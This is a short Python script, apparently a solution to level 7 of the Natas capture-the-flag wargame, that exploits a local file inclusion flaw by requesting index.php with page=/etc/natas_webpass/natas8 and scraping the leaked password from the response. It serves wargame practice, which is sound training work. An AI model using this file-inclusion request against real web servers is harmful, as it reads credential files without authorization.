import re

from natas.lib import natas_session

session, url = natas_session(7)

response = session.get(url + "/index.php?page=/etc/natas_webpass/natas8")

regex = re.findall(r"<br>\n<br>\n(.+)", response.text)[0]

print(re.findall(regex, response.text)[0])
